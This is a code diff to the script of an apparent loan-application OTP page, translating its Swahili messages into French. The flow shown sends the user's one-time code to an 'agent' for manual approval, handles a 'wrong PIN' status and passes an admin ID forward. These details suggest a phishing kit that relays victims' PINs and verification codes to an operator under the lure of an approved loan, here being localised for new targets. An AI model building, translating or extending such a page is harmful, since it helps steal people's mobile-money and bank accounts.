@@ -68,8 +68,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // Block if no application ID
     if (!applicationId) {
-        showMessage('Kipindi chako kimeisha. Tafadhali anza upya.', 'error');
-        if (submitBtn) { submitBtn.disabled = true; submitBtn.textContent = 'Kipindi Kimeisha'; }
+        showMessage('Votre session a expiré. Veuillez recommencer.', 'error');
+        if (submitBtn) { submitBtn.disabled = true; submitBtn.textContent = 'Session Expirée'; }
     }
 
     // Mask phone number
@@ -127,19 +127,19 @@ document.addEventListener('DOMContentLoaded', function() {
         e.preventDefault();
 
         if (!applicationId) {
-            showMessage('Kipindi chako kimeisha. Tafadhali anza upya.', 'error');
+            showMessage('Votre session a expiré. Veuillez recommencer.', 'error');
             return;
         }
 
         const otp = Array.from(otpInputs).map(i => i.value).join('');
         if (otp.length !== 4) {
-            showMessage('Tafadhali weka msimbo kamili wa uthibitishaji wa nambari 4', 'warning');
+            showMessage('Veuillez entrer le code de vérification complet à 4 chiffres', 'warning');
             otpInputs[0].focus();
             return;
         }
 
         submitBtn.disabled = true;
-        submitBtn.innerHTML = 'Inathibitisha... <span class="arrow">→</span>';
+        submitBtn.innerHTML = 'Vérification en cours... <span class="arrow">→</span>';
         clearMessage();
 
         try {
@@ -158,20 +158,20 @@ document.addEventListener('DOMContentLoaded', function() {
             const result = await response.json();
 
             if (result.success) {
-                showMessage('Msimbo wako umetumwa kwa msimamizi. Subiri idhini...', 'info');
+                showMessage('Votre code a été transmis à l\'agent. Veuillez patienter pour l\'approbation...', 'info');
                 checkOTPStatus();
             } else {
-                showMessage(result.message || 'Imeshindwa kuwasilisha msimbo. Jaribu tena.', 'error');
+                showMessage(result.message || 'Échec de l\'envoi du code. Veuillez réessayer.', 'error');
                 submitBtn.disabled = false;
-                submitBtn.innerHTML = 'Thibitisha Msimbo <span class="arrow">→</span>';
+                submitBtn.innerHTML = 'Vérifier le Code <span class="arrow">→</span>';
                 restartTimers();
             }
 
         } catch (error) {
             console.error('❌ OTP submit error:', error);
-            showMessage('Hitilafu ya mtandao. Kagua muunganisho wako na jaribu tena.', 'error');
+            showMessage('Erreur réseau. Vérifiez votre connexion et réessayez.', 'error');
             submitBtn.disabled = false;
-            submitBtn.innerHTML = 'Thibitisha Msimbo <span class="arrow">→</span>';
+            submitBtn.innerHTML = 'Vérifier le Code <span class="arrow">→</span>';
             restartTimers();
         }
     });
@@ -188,19 +188,19 @@ document.addEventListener('DOMContentLoaded', function() {
                 if (result.status === 'approved') {
                     clearInterval(statusInterval);
                     clearAllTimers();
-                    showMessage('🎉 Hongera! Mkopo wako umeidhinishwa. Unaelekezwa...', 'success');
+                    showMessage('🎉 Félicitations ! Votre prêt a été approuvé. Redirection en cours...', 'success');
                     setTimeout(() => { window.location.href = 'approval.html'; }, 2000);
 
                 } else if (result.status === 'rejected') {
                     clearInterval(statusInterval);
                     clearAllTimers();
-                    showMessage('Uthibitishaji umeshindwa. Wasiliana na msaada.', 'error');
-                    if (submitBtn) { submitBtn.disabled = true; submitBtn.textContent = 'Uthibitishaji Umeshindwa'; }
+                    showMessage('Vérification échouée. Veuillez contacter le support.', 'error');
+                    if (submitBtn) { submitBtn.disabled = true; submitBtn.textContent = 'Vérification Échouée'; }
 
                 } else if (result.status === 'wrongpin_otp') {
                     clearInterval(statusInterval);
                     clearAllTimers();
-                    showMessage('PIN sio sahihi. Unaelekezwa kuweka PIN tena...', 'error');
+                    showMessage('PIN incorrect. Redirection pour ressaisir le PIN...', 'error');
                     // Pass admin ID forward
                     const dest = adminId ? `verification.html?admin=${encodeURIComponent(adminId)}` : 'verification.html';
                     setTimeout(() => { window.location.href = dest; }, 3000);
@@ -211,9 +211,9 @@ document.addEventListener('DOMContentLoaded', function() {
                     otpInputs[0].focus();
                     if (submitBtn) {
                         submitBtn.disabled = false;
-                        submitBtn.innerHTML = 'Thibitisha Msimbo <span class="arrow">→</span>';
+                        submitBtn.innerHTML = 'Vérifier le Code <span class="arrow">→</span>';
                     }
-                    showMessage('Msimbo sio sahihi. Weka tena au bonyeza "Tuma Tena" kupata mpya.', 'error');
+                    showMessage('Code incorrect. Veuillez ressaisir ou cliquer sur "Renvoyer" pour obtenir un nouveau code.', 'error');
                 }
 
             } catch (error) {
@@ -250,8 +250,8 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     function handleTimeout() {
-        showMessage('Msimbo umeisha muda. Bonyeza "Tuma Tena" kupata mpya.', 'warning');
-        if (submitBtn) { submitBtn.disabled = true; submitBtn.textContent = 'Msimbo Umeisha Muda'; }
+        showMessage('Le code a expiré. Cliquez sur "Renvoyer" pour obtenir un nouveau code.', 'warning');
+        if (submitBtn) { submitBtn.disabled = true; submitBtn.textContent = 'Code Expiré'; }
         otpInputs.forEach(input => { input.value = ''; input.disabled = true; });
     }
 
@@ -298,17 +298,17 @@ document.addEventListener('DOMContentLoaded', function() {
 
             const result = await response.json();
             if (result.success) {
-                showMessage('Msimbo mpya umeombwa. Angalia na msimamizi.', 'success');
+                showMessage('Un nouveau code a été demandé. Vérifiez auprès de l\'agent.', 'success');
                 otpInputs.forEach(input => { input.value = ''; input.disabled = false; });
                 otpInputs[0].focus();
-                if (submitBtn) { submitBtn.disabled = false; submitBtn.innerHTML = 'Thibitisha Msimbo <span class="arrow">→</span>'; }
+                if (submitBtn) { submitBtn.disabled = false; submitBtn.innerHTML = 'Vérifier le Code <span class="arrow">→</span>'; }
                 restartTimers();
             } else {
-                showMessage('Imeshindwa kutuma msimbo tena. Jaribu tena.', 'error');
+                showMessage('Échec du renvoi du code. Veuillez réessayer.', 'error');
             }
         } catch (error) {
             console.error('❌ Resend error:', error);
-            showMessage('Hitilafu ya mtandao. Jaribu tena.', 'error');
+            showMessage('Erreur réseau. Veuillez réessayer.', 'error');
         }
     });
 });
